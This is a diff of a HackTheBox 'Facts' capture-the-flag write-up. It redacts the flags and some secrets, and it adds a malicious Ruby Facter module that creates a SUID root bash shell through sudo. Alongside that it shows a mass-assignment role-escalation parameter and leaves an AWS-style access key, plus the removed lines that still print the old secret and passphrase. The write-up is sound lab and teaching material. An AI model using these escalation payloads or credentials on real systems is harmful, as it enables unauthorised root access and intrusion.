@@ -7,7 +7,7 @@
 | Platform | HackTheBox |
 | Machine | Facts |
 | OS | Linux |
-| Difficulty | Medium |
+| Difficulty | Easy |
 
 ---
 
@@ -67,7 +67,7 @@ The password update endpoint failed to properly filter user-controlled parameter
 
 `password[role]=admin`
 
-the application updated the account role during a password change request.
+the application updated the account role during a profile update request.
 
 ### Impact
 
@@ -92,21 +92,21 @@ and later application configuration containing AWS credentials.
 # Initial Access
 
 1. Register a normal account.
-2. Exploit CVE-2025-2304 using the password update endpoint.
+2. Exploit CVE-2025-2304 using the password update endpoint (Mass Assignment)
 3. Obtain administrator access.
 4. Abuse the LFI endpoint.
 5. Read `/home/william/user.txt`.
 
 User flag:
 
-`e439dd8eeb23d45afc6e1133aaf12c6b`
+`REDACTED`
 
 # AWS Enumeration
 
 Filesystem configuration exposed:
 
 - Access Key: `AKIA654DC625E1DC4740`
-- Secret Key: `EonM99Hw5vbZ0TmdDRR+nk7g5qUPhWQcJnTlkPym`
+- Secret Key: `REDACTED`
 - Bucket: `randomfacts`
 - Region: `us-east-1`
 - Endpoint: `http://facts.htb:54321`
@@ -125,7 +125,7 @@ The SSH private key was downloaded and cracked using John the Ripper.
 
 Recovered passphrase:
 
-`dragonballz`
+`REDACTED`
 
 The public key identified the owner as:
 
@@ -149,14 +149,20 @@ Facter supports loading custom Ruby facts.
 
 A malicious Ruby module executed:
 
-- Copy `/bin/bash`
-- Set SUID permissions
+/tmp/exploit.rb:
+
+`Facter.add('exploit') do
+  setcode do
+    Facter::Core::Execution.exec('cp /bin/bash /var/tmp/test; chmod 6777 /var/tmp/test')
+    'Malicious fact has run'
+  end
+end`
 
 Running Facter with:
 
-`sudo /usr/bin/facter --custom-dir /tmp exploit`
+`sudo /usr/bin/facter --custom-dir /tmp/ exploit`
 
-created a SUID shell.
+created a SUID(root) shell.
 
 Executing:
 
@@ -176,7 +182,7 @@ Output:
 
 `cat /root/root.txt`
 
-`9c8450c53c597d5ed62ce687d8da92e5`
+`REDACTED`
 
 # Attack Chain Summary
 
